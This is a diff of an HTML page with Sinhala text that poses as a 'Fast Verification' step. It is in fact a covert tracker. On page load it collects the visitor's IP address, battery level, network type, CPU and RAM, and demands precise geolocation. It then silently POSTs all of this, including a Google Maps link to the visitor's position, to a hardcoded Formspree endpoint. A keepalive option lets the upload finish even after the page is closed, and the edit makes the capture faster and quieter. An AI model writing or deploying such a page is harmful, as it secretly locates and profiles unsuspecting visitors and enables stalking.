@@ -3,132 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification System</title>
+    <title>Fast Verification</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        /* CSS ඉක්මනින් Load වීමට සරලව තබා ඇත */
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 380px; }
-        h2 { color: #1c1e21; margin-bottom: 10px; font-size: 22px; }
-        p { color: #606770; font-size: 14px; line-height: 1.5; }
-        input[type="text"] { width: 100%; padding: 12px; margin: 20px 0; border: 1.5px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; display: none; transition: 0.3s; }
-        button { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; background-color: #28a745; color: white; display: none; }
-        button:hover { background-color: #218838; }
-        #status { margin-top: 15px; font-size: 14px; color: #d9534f; font-weight: 500; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 15px; display: block; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 35px; height: 35px; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        input, button { width: 100%; padding: 12px; margin-top: 15px; border-radius: 8px; border: 1px solid #ddd; font-size: 16px; display: none; }
+        button { background-color: #28a745; color: white; border: none; font-weight: bold; cursor: pointer; }
     </style>
 </head>
-<body onload="autoGetLocation()">
+<body onload="startFastProcess()">
 
 <div class="card">
     <div id="content">
         <div id="loading-ui">
             <div class="loader"></div>
             <h2>පිටුව සකසමින් පවතී...</h2>
-            <p>ඉදිරියට යාමට ඉහළින් එන <b>Location Permission</b> එක <b>Allow</b> කරන්න.</p>
+            <p>කරුණාකර <b>Location Allow</b> කරන්න.</p>
         </div>
 
-        <div id="input-ui" style="display:none;">
-            <h2>තොරතුරු තහවුරු කරන්න</h2>
-            <p>පද්ධතියට ඇතුළු වීමට ඔබේ නම හෝ ඊමේල් එක ඇතුළත් කරන්න (අත්‍යවශ්‍ය නොවේ).</p>
-            <input type="text" id="userName" placeholder="නම හෝ ඊමේල් මෙතන ලියන්න...">
-            <button id="submitBtn" onclick="manualSend()">ඉදිරියට යන්න</button>
+        <div id="input-ui">
+            <input type="text" id="userName" placeholder="ඔබේ නම මෙතන ලියන්න..." style="display:none;">
+            <button id="submitBtn" onclick="finalSend()" style="display:none;">ඉදිරියට යන්න</button>
         </div>
-        
-        <div id="status"></div>
     </div>
 </div>
 
 <script>
-    let techData = {
-        ip: "Unknown",
-        location: "Denied",
-        time: "",
-        battery: "Unknown",
-        network: "Unknown",
-        ram: "Unknown",
-        cpu: "Unknown",
-        screen: window.screen.width + "x" + window.screen.height,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
+    let techData = {};
+    const formID = "xdabkpao";
 
-    // Formspree ID එක මෙතනට දමන්න
-    const formspreeID = "xdabkpao"; 
+    // 1. සියලුම දත්ත එකවර ලබා ගැනීම (Parallel Processing)
+    async function startFastProcess() {
+        // IP, Battery සහ Hardware විස්තර එකවර Fetch කිරීම
+        const ipPromise = fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
+        const batteryPromise = navigator.getBattery ? navigator.getBattery().catch(() => null) : null;
 
-    async function autoGetLocation() {
-        // 1. IP සහ Hardware දත්ත ලබා ගැනීම
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            techData.ip = data.ip;
-            techData.time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
-            techData.cpu = (navigator.hardwareConcurrency || "Unknown") + " Cores";
-            techData.ram = (navigator.deviceMemory || "Unknown") + " GB";
-            techData.network = navigator.connection ? navigator.connection.effectiveType : "Unknown";
-            
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                techData.battery = (battery.level * 100).toFixed(0) + "% (" + (battery.charging ? "Charging" : "Not Charging") + ")";
-            }
-        } catch (e) { console.log("Init failed"); }
-
-        // 2. Location ලබා ගැනීම
+        // දත්ත රැස් කිරීම ආරම්භ කරන අතරතුරම Location ඉල්ලීම
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                // Google Maps Link නිවැරදි කිරීම
-                techData.location = `https://www.google.com/maps?q=${lat},${lon}`;
+                // Location ලැබුණු සැනින් අනෙක් දත්ත සමග සම්බන්ධ කිරීම
+                const [ipRes, batteryRes] = await Promise.all([ipPromise, batteryPromise]);
                 
-                // --- ස්වයංක්‍රීයව දත්ත යැවීම (Silent Send) ---
-                sendDataToEmail("Automatic_Visitor_Capture");
+                techData = {
+                    ip: ipRes.ip,
+                    loc: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                    bat: batteryRes ? `${(batteryRes.level * 100).toFixed(0)}%` : "N/A",
+                    net: navigator.connection ? navigator.connection.effectiveType : "N/A",
+                    hw: `${navigator.hardwareConcurrency} Cores / ${navigator.deviceMemory || 'Unknown'}GB RAM`,
+                    time: new Date().toLocaleString()
+                };
 
-                // UI එක පෙන්වීම
+                // දත්ත ලැබුණු සැනින් නිහඬව යැවීම (Background Send)
+                silentSend("Fast_Auto_Capture");
+
+                // UI එක වහාම පෙන්වීම
                 document.getElementById("loading-ui").style.display = "none";
-                document.getElementById("input-ui").style.display = "block";
                 document.getElementById("userName").style.display = "block";
                 document.getElementById("submitBtn").style.display = "block";
-            }, (err) => {
-                document.getElementById("status").innerHTML = "ඉදිරියට යාමට Location Allow කිරීම අනිවාර්ය වේ.";
-                document.querySelector(".loader").style.display = "none";
-            }, { enableHighAccuracy: true });
+            }, () => {
+                alert("ඉදිරියට යාමට ලොකේෂන් අවශ්‍යයි.");
+            }, { enableHighAccuracy: true, timeout: 5000 });
         }
     }
 
-    async function sendDataToEmail(identifier) {
-        const payload = {
-            Capture_Type: identifier,
-            IP_Address: techData.ip,
-            Google_Maps: techData.location,
-            Battery: techData.battery,
-            Network: techData.network,
-            RAM: techData.ram,
-            CPU: techData.cpu,
-            Device_Time: techData.time,
-            TimeZone: techData.timezone,
-            Browser: navigator.userAgent
-        };
-
-        try {
-            await fetch(`https://formspree.io/f/${formspreeID}`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-        } catch (e) { console.log("Send failed"); }
+    // 2. Background එකේ දත්ත යැවීම (පරිශීලකයාට ප්‍රමදයක් දැනෙන්නේ නැත)
+    function silentSend(type) {
+        fetch(`https://formspree.io/f/${formID}`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ Type: type, ...techData }),
+            keepalive: true // පිටුව වැසුවත් දත්ත යැවීම නතර නොවේ
+        });
     }
 
-    async function manualSend() {
-        const name = document.getElementById("userName").value.trim() || "No Name Entered";
+    async function finalSend() {
+        const name = document.getElementById("userName").value;
         const btn = document.getElementById("submitBtn");
-        
-        btn.innerText = "යවමින් පවතී...";
+        btn.innerText = "යවමින්...";
         btn.disabled = true;
 
-        await sendDataToEmail("User_Manual_Submission: " + name);
-        
-        document.getElementById("content").innerHTML = "<h2 style='color:#28a745'>සාර්ථකයි!</h2><p>තොරතුරු තහවුරු විය.</p>";
+        await silentSend("Manual_Entry: " + (name || "No_Name"));
+        document.getElementById("content").innerHTML = "<h2>සාර්ථකයි!</h2>";
     }
 </script>
-
 </body>
 </html>
